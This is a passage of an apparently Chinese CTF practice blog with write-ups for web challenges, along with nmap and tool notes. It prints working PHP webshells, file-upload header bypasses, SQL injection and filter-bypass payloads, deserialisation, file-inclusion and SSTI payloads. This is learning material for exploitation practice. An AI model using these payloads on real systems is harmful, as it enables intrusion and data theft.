zjctf；接着判断上传的文件名是否有敏感词flag，若不存在则执行include函数；最后将上传的password的值反序列化并输出。 我们一步步来，先看第一步，我们可以看到很明显不存在text文件，那么我们是不是可以直接给text赋值welcome to the zjctf呢？但是试着直接赋值，发现没有回显，因此说明直接赋值肯定是不行的。我们尝试着使用http伪协议，试试能不能行。 第一种php://input 此协议需要 allow_url_include 为 on ，可以访问请求的原始数据的只读流, 将post请求中的数据作为 PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为 php://input ,同时post想设置的文件内容，php执行时会将post内容当作文件内容。这里用 HackBar 报错了 但是用bp抓包，再上传就看到有回显，说明这样子是可行的。 第二种data://伪协议 data://协议需要满足双on条件，作用和 php://input 类似 这里有一点需要注意的是，按照上述方法只读流时，要把php代码用base64编码后再上传，因为如果我们直接上传可能有些字符会被过滤。 因此第一步的payload：?text=data:text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY= 再看第二步，我们注意到有include函数，那么可能就存在文件包含漏洞，用php://filter文件读取流，直接读取flag.php肯定是不行的了，因为第二个判断就要满足文件名中不包含flag字词。此处又提醒我们有一个useless文件，因此我们尝试读取该文件内容 第二步的payload：file=php://filter/read=convert.base64-encode/resource=useless.php 对回显的内容进行base64解码即可： 1234567891011121314&lt;?php class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125; &#125; ?&gt; 代码审计发现包含文件中的变量file没有做任何防护措施，也就是说我们可以随意控制file的值。 附上exp： 代码执行完后会产生序列化字符串：O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;； 当我们把这串字符串作为参数password的值上传后，unserialize函数将其反序列化，这时结合file_get_contents函数打开flag.php文件，读取并输出回显。 因此这就构成了第三个payload：?password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 总结上述的三个payload，将他们合成一个： ?text=data:text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; F12查看源码获得flag： 总结：这是一道关于http伪协议、文件包含漏洞和反序列化的题目，只要懂得对应的点感觉还是比较容易的。","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"bugku3","date":"2021-07-12T10:33:50.000Z","path":"2021/07/12/bugku3/","text":"最近看bugku新上了一波题，就做一下 Game1打开容器，发现是一个搭房子的小游戏，一般这种题都是靠修改得分来达到获取flag要求。 f12查看源码： 注意到一个提交文件，他包括了三个变量——score就是该局游戏得分，ip固定为ppp的值，sign为该局游戏得分经过base64编码后的值 因此我们可以构造payload：score.php?score=6666&amp;ip=110.90.9.142&amp;sign=NjY2Ng== 但是这样回显是失败的，为什么会这样呢？试玩两局游戏 我们知道50的base64编码是NTA=，而这里看到他前面还多了前缀zM 多玩了几局后发现他真实的sign=&#39;zM&#39;+&#39;Base64.encode(score.toString())&#39;+&#39;==&#39; 加上前缀后就成功得到flag啦 sp：由于最近在学习python所以就学习大佬的脚本看看能不能跑出爆flag的临界点再哪： 123456789101112131415import requestsfrom base64 import b64encodeurl=&quot;http://114.67.246.176:15342/score.php?score=&quot;url2=&quot;&amp;ip=110.90.9.142&amp;sign=zM&quot;for i in range (1000,100000): i=str(i) j=b64encode(i.encode()) j=j.decode() r=requests.get(url+i+url2+j+&#x27;==&#x27;) print(i) if &#x27;失败了&#x27; not in r.text: print (r.text) break 我们可以看到临界点就是3000分 参考博客：https://blog.csdn.net/weixin_44190459/article/details/116648352 变量1打开容器我们就可以看到源码： 12345678910111213&lt;?php error_reporting(0);include &quot;flag1.php&quot;;highlight_file(__file__);if(isset($_GET[&#x27;args&#x27;]))&#123; $args = $_GET[&#x27;args&#x27;]; if(!preg_match(&quot;/^\\w+$/&quot;,$args))&#123; die(&quot;args error!&quot;); &#125; eval(&quot;var_dump($$args);&quot;);&#125;?&gt; 代码审计我们得知我们传参的值定只含数字，字母，下划线。因此这里过滤了所有的符号。 但是我们看到这里存在一个可变变量，可变变量： 是一种独特的变量，它允许动态改变一个变量名称。其工作原理是该变量的名称由另外一个变量的值来确定，实现过程就是在变量的前面再多加一个美元符号“S”。 而这里**var_dump()**函数 显示关于一个或多个表达式的结构信息，包括表达式的类型与值。结合可变变量名那么就会返回对应的键值。 此时我们要联想到php中超全局变量 $GLOBALS ，PHP 在名为$GLOBALS[index]的数组中存储了所有全局变量 因此构造payload：?args=GLOBLAS 参考博客：https://blog.csdn.net/xuchen16/article/details/82737194 秋名山车神点开容器就给我们一长串数字要我们在两秒内计算完成，显然是不可能实现的，因此需要构造脚本： 123456789import requestsimport reurl = &#x27;&#x27;&#x27;http://114.67.246.176:19230/&#x27;&#x27;&#x27;s = requests.session()retuen = s.get(url)equation = re.search(r&#x27;(\\d+[+\\-*])+(\\d+)&#x27;, retuen.text).group()result = eval(equation)key = &#123;&#x27;value&#x27;:result&#125;print(s.post(url, data = key).text) 跑脚本的时候可能不会每次都出flag（可能给出的式子溢出或者什么的），没出就多跑几次 参考资料：关于对python脚本的理解（主要是python脚本下的正则匹配）：https://blog.csdn.net/weixin_43578492/article/details/101701339","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf5","date":"2021-07-11T01:35:54.000Z","path":"2021/07/11/buuctf5/","text":"[护网杯 2018]easy_tornado打开容器发现有三个txt文件: /flag.txt，由此我们猜测flag最终可能藏在/fllllllllllllag之下 /welcome.txt，因为render是生成模板函数，所以考虑是否存在ssti注入 sp：render函数的介绍https://blog.csdn.net/qq78827534/article/details/80792514 /hints.txt 结合URL栏的信息，我们可知filehash的值是md5(cookie_secret+md5(filename))，也即此处filehash的值是md5(cookie_secret+md5(hints)) 但是这里有个疑问cookie_secret是什么呢？通过查阅大佬的博客发现cookie_secret在Application对象settings属性中，还发现self.application.settings有一个别名。handler指向处理当前这个页面的RequestHandler对象， RequestHandler.settings指向self.application.settings， 因此handler.settings指向RequestHandler.application.settings 知道了cookie_secret在哪了，就要想着怎么获取它，之前提到可能存在ssti注入， 现在来验证一下，当我输入?filename=/flag.txt&amp;filehash=&#123;&#123;1&#125;&#125;： 说明存在ssti漏洞，虽然它过滤掉了一些字符，但是这里Error=Error。 因此结合前面获取cookie_secret的方法， 构造payload：http://e7be24f2-7da0-43fa-a090-c9e6e96f1049.node4.buuoj.cn/error?msg=&#123;&#123;handler.settings&#125;&#125; 使用下面脚本 1234import hashlibs1=(hashlib.md5(&quot;/fllllllllllllag&quot;.encode())).hexdigest()print((hashlib.md5((&quot;87928a6f-e43f-4549-bc43-a101005cfb7f&quot;+s1).encode())).hexdigest()) 构造payload： http://e7be24f2-7da0-43fa-a090-c9e6e96f1049.node4.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=61f9debba03909a86238270e8c7fb594 总结：感觉关于获取cookie_secret那块还是有点模糊，ssti也是一大块的内容，暂时初学了一点。 https://blog.csdn.net/zz_Caleb/article/details/96480967 https://blog.csdn.net/weixin_45642610/article/details/112519061 https://www.cnblogs.com/wangtanzhi/p/12238779.html [极客大挑战 2019]Upload打开容器，发现是一道文件上传漏洞题，尝试上传webshell.php: 1&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt; 也就是说我们只能上传图片后缀的文件，尝试上传webshell.gif文件然后抓包改为webshell.phtml： 修改一句话木马webshell2.gif： 1&lt;script language=&quot;php&quot;&gt;eval(@POST[&#x27;pass&#x27;])&lt;/script&gt; 然后上传webshell2.gif文件： 也就是他对文件头也进行了检查，这里其实就设立了一个考点——关于GIF89a文件头欺骗，它可以绕过文件头检查。因此再修改一句话木马webshell3.gif： 12GIF89a&lt;script language=&quot;php&quot;&gt;eval(@POST[&#x27;pass&#x27;])&lt;/script&gt; 上传webshell3.gif文件然后抓包改为webshell3.phtml， 上传成功！ 然后用蚁剑连接，猜测上传路径是/upload 连接成功，打开虚拟终端，cat /flag： [ACTF2020 新生赛]Upload打开容器，是一道文件上传题。 上传一句话木马webshell.jpg： 1&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt; 上传成功 上传webshell.jpg 抓包改后缀webshell.php 上传失败 再上传webshell.jpg 抓包改后缀webshell.phtml 上传成功，蚁剑连接，cat /flag 总结：感觉这题比上面那题还容易，就仅对文件上传后缀进行了限制","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"CTF工具用法","date":"2021-06-06T03:16:10.000Z","path":"2021/06/06/CTF工具用法/","text":"dirsearch指令：python dirsearch.py -u”127.0.0.1” nmapnmap常见的指令 nmap -v 详细信息输出 nmap -p 指定端口 nmap -iL 扫描文件中的ip nmap -exclude 不扫描某些ip nmap -Pn 使用ping扫描，显式地关闭端口扫描，用于主机发现 nmap -sn 使用ping扫描，进行端口扫描，假设主机都是up的 nmap -sS 使用SYN扫描，不需要完成三次握手 nmap -sT TCP connect扫描，需要完成三次握手，只适用于找出TCP和UDP端口 nmap -sU 扫描UDP端口 nmap -sF FIN扫描，用于探测防火墙状态，识别端口是否关闭，容易漏扫 nmap -sV 扫描目标主机的端口和软件版本 nmap -O 远程检测操作系统和软件 nmap -O –osscan-guess 猜测目标操作系统版本 nmap -traceroute 路由跟踪 nmap -A 综合扫描，包含1-10000的端口ping扫描，操作系统扫描，脚本扫描，路由跟踪，服务探测 nmap -oN result.txt 将标准输出写入到指定文件中 nmap -oX result.xml 将输入写成xml的形式 nmap -oS result.txt 将输出写成特殊符号的形式，内容跟-oN是一样的，只是字体变了而已 nmap -oG result.txt 将输出写成特殊格式 nmap -oA 将输出所有格式，有三种 .xml/ .gnmap/ .nmap nmap -T[0-5] 时间参数模板 -T0 用于躲避IDS，时间很长 -T1 用于躲避IDS，时间很长 -T2 降低了扫描速度，使用更小的带宽和目标主机资源对目标靶机进行扫描 -T3 默认模式，未做优化 -T4 假设用户具有合适及可靠的网络而加速对目标靶机的扫描 -T5 假设用户具有更好的网络或者愿意牺牲准确性而加速扫描 nmap -sC 根据端口识别服务自动调用默认脚本 参考资料：https://blog.csdn.net/haha13l4/article/details/89737637?utm_medium=distribute.pc_relevant_download.none-task-blog-baidujs-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant_download.none-task-blog-baidujs-1.nonecase GitHack指令：GitHack.py 127.0.0.1/.git/ 当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。GitHack是一个.git泄露利用测试脚本，通过泄露的文件，还原重建工程源代码。","tags":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"}]},{"title":"buuctf4","date":"2021-05-23T06:43:06.000Z","path":"2021/05/23/buuctf4/","text":"[极客大挑战 2019]BabySQL打开容器，发现是一个登入得界面，确定是一道SQL注入题 先用万能密码尝试一下： 我们看到or并没有起到作用，说明他被过滤了，尝试双写绕过： 我们看到登入成功了，尝试union联合注入，但是我们发现服务器过滤了union 和 select，也尝试双写绕过： ?username=1’%20 uniounionn selecselectt 1%23&amp;password=123 我们看到成功注入了，但是列数不匹配，增加列数： 开始爆库：?username=1&#39; ununionion seselectlect 1,2,database()%23&amp;password=1返回的是默认数据库 查一下所有数据库： ?username=1&#39; ununionion seselectlect 1,2,group_concat(schema_name) frfromom (infoorrmation_schema.schemata) %23&amp;password=1 感觉flag可能藏在ctf数据库中 爆表：?username=1&#39; ununionion seselectlect 1,2,group_concat(table_name)frofromm(infoorrmation_schema.tables)whwhereere table_schema=&#39;ctf&#39; %23&amp;password=1 爆列：?username=1&#39; uniounionn selecselectt 1,2,group_concat(column_name) frofromm (infoorrmation_schema.columns) wherwheree table_name=&quot;Flag&quot;%23&amp;password=1 爆值：?username=1&#39; uniounionn selecselectt 1,2,group_concat(flag) frofromm (ctf.Flag)%23&amp;password=1 [MRCTF2020]Ez_bypass打开容器发现一段php代码，整理得： 1234567891011121314151617181920212223242526272829303132333435363738394041I put something in F12 for youinclude &#x27;flag.php&#x27;;$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123; $id=$_GET[&#x27;id&#x27;]; $gg=$_GET[&#x27;gg&#x27;]; if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123; echo &#x27;You got the first step&#x27;; if(isset($_POST[&#x27;passwd&#x27;])) &#123; $passwd=$_POST[&#x27;passwd&#x27;]; if (!is_numeric($passwd)) &#123; if($passwd==1234567) &#123; echo &#x27;Good Job!&#x27;; highlight_file(&#x27;flag.php&#x27;); die(&#x27;By Retr_0&#x27;); &#125; else &#123; echo &quot;can you think twice??&quot;; &#125; &#125; else&#123; echo &#x27;You can not get it !&#x27;; &#125; &#125; else&#123; die(&#x27;only one way to get the flag&#x27;); &#125;&#125; else &#123; echo &quot;You are not a real hacker!&quot;; &#125;&#125;else&#123; die(&#x27;Please input first&#x27;);&#125;&#125;Please input first 代码审计可知，我们通过GET获取gg和id两个参数，通过POST获取passwd。 先来看第一个判断语句：if( md5($id) === md5($gg) &amp;&amp; $id !== $gg ) 它要求我们两组参数的值要不相等，但md5编码后的值相等 我们之前有做过md5绕过，弱等于判断，这里可以利用数组绕过md5。因为md5无法编码数组，会返回null。 构造第一个payload：?id[]=1&amp;gg[]=2 再看第二个判断语句：if ( !is_numeric($passwd) ) if( $passwd==1234567 )他要求我们POST的参数passwd的值类型不为数字，但是又判断passwd的值是都等于1234567，这里我们可以使用弱等于绕过 构造第二个payload：password=1234567a 最后，通过hackbar上传我们的payload即可获取flag [BJDCTF2020]Easy MD5打开容器，发现就一个查询框，查看源码没发现什么重要的信息。 随机输入数字1，发现没什么回显，但是看到URL栏跳出passwd=1 尝试抓包： 发现回文中藏着hint——将我们输入上传的passwd经过md5编码后带入sql查询语句。 这里介绍一下md5()函数： 语法：md5(string,raw) 参数 描述 string 必需。规定要计算的字符串。 raw 可选。规定十六进制或二进制输出格式： TRUE - 原始 16 字符二进制格式 FALSE - 默认。32 字符十六进制数 **sp:**原始二进制数据不是指0101这些二进制数据，而是原始字符串转换成ascii码后组成的字符串。 关于md5输出原始二进制的转换过程和机制参考博客：https://www.7gugu.com/2020/01/15/%E6%8E%A2%E7%A9%B6php%E7%9A%84md5%E5%87%BD%E6%95%B0%E8%BE%93%E5%87%BA%E7%9A%84%E5%8E%9F%E5%A7%8B%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE%E6%98%AF%E5%95%A5/ 我们可以看到提示要求我们输入的passwd经过md5编码后要等于真的密码，但是我们怎么会知道密码呢，那么关键点肯定就是在md5上。通过查阅资料我们得知可以使用ffifdyop绕过，其经过md5(ffifdyop,raw)后为&#39;or&#39;6xxxxxxxxxx； 带入sql语句中为：select * from &#39;admin&#39; where password=&#39;&#39;or&#39;6xxxxxxxxxx&#39;，也就是说构成了一句用真式。那么这时带入数据库中就不会返回空了。 输入ffifdyop后跳转到一个新的页面，查看源码： 1234567&lt;!--$a = $GET[&#x27;a&#x27;];$b = $_GET[&#x27;b&#x27;];if($a != $b &amp;&amp; md5($a) == md5($b))&#123; // wow, glzjin wants a girl friend.--&gt; 这里我们用数组绕过md5即可，构造payload：?a[]=a&amp;b[]=b 绕过 有跳转到另一个页面，又是一串代码： 123456789 &lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123; echo $flag;&#125; 这里我们依旧采用数组绕过md5即可： 需要注意的是后面一个等号是强等于，那么我们就不能使用哈希碰撞来绕过md5。因为PHP强等于时就不会把以0E开头的哈希值解释为0。 sp：最近还做了蛮多md5绕过的题，有一个关于md5绕过的博客写的挺全面的：https://blog.csdn.net/CSDNiamcoming/article/details/108837347","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"序列化与反序列化","date":"2021-05-22T02:37:59.000Z","path":"2021/05/22/序列化与反序列化/","text":"序列和反序列化：简单来说： 序列化——将变量或对象转换成字符串的过程。 反序列化——将字符串转换成变量或对象的过程。 常见的魔术方法：1234567_construct()：创建对象时初始化_destruction()：结束时销毁对象_toString()：对象被当作字符串时使用_sleep()：序列化对象之前调用_wakeup()：反序列化对象之前调用_call()：调用对象不存在时使用_get()：调用私有属性时使用 常见的访问控制修饰符12345public(公有)protected(受保护)private(私有的)protected属性被序列化的时候属性值会变成：%00*%00属性名private属性被序列化的时候属性值会变成：%00类名%00属性名 序列化中每个字母的表示 a array数组 b boolean判断类型 d double浮点数 i integer整数型 o common object 一般的对象 r reference引用类型 s string字符串类型 C custom object O class N null R pointer reference U unicode string 借阅资料： https://blog.csdn.net/bmth666/article/details/104737025","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf3","date":"2021-05-21T13:20:13.000Z","path":"2021/05/21/buuctf3/","text":"[护网杯 2018]easy_tornado[极客大挑战 2019]Http查看源码： 访问Secret.php 这题应该是伪造HTTP协议，burp抓包，伪造Referer： 他要求我们用Syclover，伪造User-Agent： 他又要求只能本地访问，伪造X-Forwarded-For： [极客大挑战 2019]PHP打开容器： 发现这样一句话，猜测应该是备份文件泄露，用dirsearch扫描一下，但是这个网址的服务器可能做得不大好会扫崩，所以我们来手工测试一下。尝试www.zip：![image-20210522105338750](buuctf3.assets/image-20210522105338750.png) 查阅有发现就两个文件有用： class.php： 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpinclude &#x27;flag.php&#x27;;error_reporting(0);class Name&#123; private $username = &#x27;nonono&#x27;; private $password = &#x27;yesyes&#x27;; public function __construct($username,$password)&#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125; function __wakeup()&#123; $this-&gt;username = &#x27;guest&#x27;; &#125; function __destruct()&#123; if ($this-&gt;password != 100) &#123; echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;; die(); &#125; if ($this-&gt;username === &#x27;admin&#x27;) &#123; global $flag; echo $flag; &#125;else&#123; echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;; die(); &#125; &#125;&#125;?&gt; index.php: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;!DOCTYPE html&gt;&lt;head&gt; &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt; &lt;title&gt;I have a cat!&lt;&#x2F;title&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;meyer-reset&#x2F;2.0&#x2F;reset.min.css&quot;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;style.css&quot;&gt;&lt;&#x2F;head&gt;&lt;style&gt; #login&#123; position: absolute; top: 50%; left:50%; margin: -150px 0 0 -150px; width: 300px; height: 300px; &#125; h4&#123; font-size: 2em; margin: 0.67em 0; &#125;&lt;&#x2F;style&gt;&lt;body&gt;&lt;div id&#x3D;&quot;world&quot;&gt; &lt;div style&#x3D;&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;&quot;&gt;因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯 &lt;&#x2F;div&gt; &lt;div style&#x3D;&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;&quot;&gt;不愧是我！！！ &lt;&#x2F;div&gt; &lt;div style&#x3D;&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;&quot;&gt; &lt;?php include &#39;class.php&#39;; $select &#x3D; $_GET[&#39;select&#39;]; $res&#x3D;unserialize(@$select); ?&gt; &lt;&#x2F;div&gt; &lt;div style&#x3D;&quot;position: absolute;bottom: 5%;width: 99%;&quot;&gt;&lt;p align&#x3D;&quot;center&quot; style&#x3D;&quot;font:italic 15px Georgia,serif;color:white;&quot;&gt; Syclover @ cl4y&lt;&#x2F;p&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;script src&#x3D;&#39;http:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;three.js&#x2F;r70&#x2F;three.min.js&#39;&gt;&lt;&#x2F;script&gt;&lt;script src&#x3D;&#39;http:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;gsap&#x2F;1.16.1&#x2F;TweenMax.min.js&#39;&gt;&lt;&#x2F;script&gt;&lt;script src&#x3D;&#39;https:&#x2F;&#x2F;s3-us-west-2.amazonaws.com&#x2F;s.cdpn.io&#x2F;264161&#x2F;OrbitControls.js&#39;&gt;&lt;&#x2F;script&gt;&lt;script src&#x3D;&#39;https:&#x2F;&#x2F;s3-us-west-2.amazonaws.com&#x2F;s.cdpn.io&#x2F;264161&#x2F;Cat.js&#39;&gt;&lt;&#x2F;script&gt;&lt;script src&#x3D;&quot;index.js&quot;&gt;&lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 其中关键的代码段： 12345&lt;?phpinclude &#x27;class.php&#x27;;$select = $_GET[&#x27;select&#x27;];$res=unserialize(@$select);?&gt; 至此，我们可以知道这是一道反序列化题，当username=admin，password=100时输出flag。但是这里有个麻烦，__wakeup()魔术方法会在反序列化前跳出来执行，也就是username被赋值guest，就破坏了输出flag的条件，因此我们要想办法绕过__wakeup()魔术方法：在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行。 我们尝试构造payload： ?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125; 这里要注意：由于这里的username和password属于private变量（private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。），因此在序列化的时候会在字段名前面增加所属类名，并且类名和字段名前要加前缀0。 [RoarCTF 2019]Easy Calc打开容器，发现这是一个计算机，查看一下源码： 现在我们知道服务器端存在一个WAF； 我们先访问一下calc.php： 我们看到他过滤了一些符号，同时利用num传参 这里我们要引入一个新的知识点：利用PHP的字符串解析特性Bypass我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。 例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)；其中%20被删除[被下划线替换。 如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过： /news.php?%20news[id%00=a 因为此时的变量名是%20new[id，而WAF识别的变量名是new_id，当php解析时会将%20和[删去，将%20news[id%00的值将存储到$_GET[“news_id”]中。 PHP的字符串解析对部分字符的操作： 符号 操作 . 下划线替换 [ 下划线替换 %20（ ） 删除 + 删除 我们看到由于存在eval()函数，因此存在eval()代码执行漏洞： PHP函数：🌸scandir()：以数组形式返回指定目录中的文件和目录🌸var_dump()：输出变量的相关信息。显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。🌸file_get_contents()：把整个文件读入一个字符串中。 总结:我们通过PHP的字符串解析特性绕过防火墙，利用eval()代码执行漏洞获取flag 构造paylaod： 扫描服务器根目录下文件：calc.php? num=var_dump(scandir(chr(47))) 获取flagg文件的内容：calc.php? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) ？疑问：为什么calc.php?+num=var_dump(system(chr(96).chr(108).chr(115).chr(96)))无法获取服务器底下目录 参考资料： https://www.icode9.com/content-4-703121.html https://www.freebuf.com/articles/web/213359.html","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"做题思路","date":"2021-05-13T11:30:19.000Z","path":"2021/05/13/web做题思路/","text":"常见的备份文件后缀： .index.php.swpindex.php.swpindex.php.bak.index.php~index.php.bak_Edietplusindex.php.~index.php.1index.phpindex.php~index.php.rarindex.php.zipindex.php.7zindex.php.tar.gz.index.php.swowww.rarwww.zipwww.7zwww.tar.gzwww.tarweb.zipweb.rarweb.7zweb.tar.gzweb.tarwwwroot.rarweb.rar","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"ISCC","date":"2021-05-04T04:23:03.000Z","path":"2021/05/04/2021ISCC/","text":"web：ISCC客服冲冲冲（一）——关于js前端打开容器： 发现右边那个会自动加票，而且加的非常快，如果手动点击20秒内肯定干不过 根据经验这种题肯定是前端的题，F12打开控制器，查看源码 删除箭头所指一行代码，这样就没办法给假的客服偷票，然后在倒计时内疯狂给真的客服投票就好了。 web：这是啥——jsfuck打开容器： 查看源码： 发现了一大串这种符号，因为之前有做过类似的，知道这是jsfuck编码。直接复制，粘贴在控制台上回车执行 web：Web01——robots文件+正则匹配打开容器： 查看robots.txt 接着访问/src/code/code.txt，跳出404，然后我试着把/src删掉，结果就可以了。为什么呢？我问了大佬，这个src就代指了上面的ip，因此我们只要输入/code/code.txt就好了 代码审计： 我们可以看到通过?password传参，先判断password的值是否为是既含数字又含字母的，接着判断传参的字符串长度是否超过8，同时传参的值是否大于9999999，最后判断字符串中是否存在*-* 那么我们现在理清一下要满足的条件： 1.要既含字母又含字符串 2.长度不得超过8，且值必须大于9999999——用科学计数法绕过 3.存在*-* 那么对应的payload：1e8*-* web：登录——网站备份文件泄露+反序列化字符串逃逸刚刚打开容器还以为这是一道SQL注入题，但是试了一会后感觉不对劲，尝试用dirsearch扫描一下服务器端口 我们可以看到有好几个php文件，但是前三个文件打开后都是空白文件，尝试打开第四个 （sp：网站的文件都是放置在www文件夹下面的，zip是一种压缩格式。也就是WWW文件夹里面的文件全部压缩在www.zip里面了。） 一 一打开文件进行代码审计一下： class.php： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101&lt;?phprequire(&#x27;config.php&#x27;);class user extends mysql&#123; private $table = &#x27;users&#x27;; public function is_exists($username) &#123; $username = parent::filter($username); $where = &quot;username = &#x27;$username&#x27;&quot;; return parent::select($this-&gt;table, $where); &#125; public function register($username, $password) &#123; $username = parent::filter($username); $password = parent::filter($password); $key_list = Array(&#x27;username&#x27;, &#x27;password&#x27;); $value_list = Array($username, md5($password)); return parent::insert($this-&gt;table, $key_list, $value_list); &#125; public function login($username, $password) &#123; $username = parent::filter($username); $password = parent::filter($password); $where = &quot;username = &#x27;$username&#x27;&quot;; $object = parent::select($this-&gt;table, $where); if ($object &amp;&amp; $object-&gt;password === md5($password)) &#123; return true; &#125; else &#123; return false; &#125; &#125; public function show_profile($username) &#123; $username = parent::filter($username); $where = &quot;username = &#x27;$username&#x27;&quot;; $object = parent::select($this-&gt;table, $where); return $object-&gt;profile; &#125; public function update_profile($username, $new_profile) &#123; $username = parent::filter($username); $new_profile = parent::filter($new_profile); $where = &quot;username = &#x27;$username&#x27;&quot;; return parent::update($this-&gt;table, &#x27;profile&#x27;, $new_profile, $where); &#125; public function __tostring() &#123; return __class__; &#125;&#125;class mysql &#123; private $link = null; public function connect($config) &#123; $this-&gt;link = mysql_connect( $config[&#x27;hostname&#x27;], $config[&#x27;username&#x27;], $config[&#x27;password&#x27;] ); mysql_select_db($config[&#x27;database&#x27;]); mysql_query(&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;); return $this-&gt;link; &#125; public function select($table, $where, $ret = &#x27;*&#x27;) &#123; $sql = &quot;SELECT $ret FROM $table WHERE $where&quot;; $result = mysql_query($sql, $this-&gt;link); return mysql_fetch_object($result); &#125; public function insert($table, $key_list, $value_list) &#123; $key = implode(&#x27;,&#x27;, $key_list); $value = &#x27;\\&#x27;&#x27; . implode(&#x27;\\&#x27;,\\&#x27;&#x27;, $value_list) . &#x27;\\&#x27;&#x27;; $sql = &quot;INSERT INTO $table ($key) VALUES ($value)&quot;; return mysql_query($sql); &#125; public function update($table, $key, $value, $where) &#123; $sql = &quot;UPDATE $table SET $key = &#x27;$value&#x27; WHERE $where&quot;; return mysql_query($sql); &#125; public function filter($string) &#123; $escape = array(&#x27;\\&#x27;&#x27;, &#x27;\\\\\\\\&#x27;); $escape = &#x27;/&#x27; . implode(&#x27;|&#x27;, $escape) . &#x27;/&#x27;; $string = preg_replace($escape, &#x27;_&#x27;, $string); $safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;); $safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;; return preg_replace($safe, &#x27;hacker&#x27;, $string); &#125; public function __tostring() &#123; return __class__; &#125;&#125;session_start();$user = new 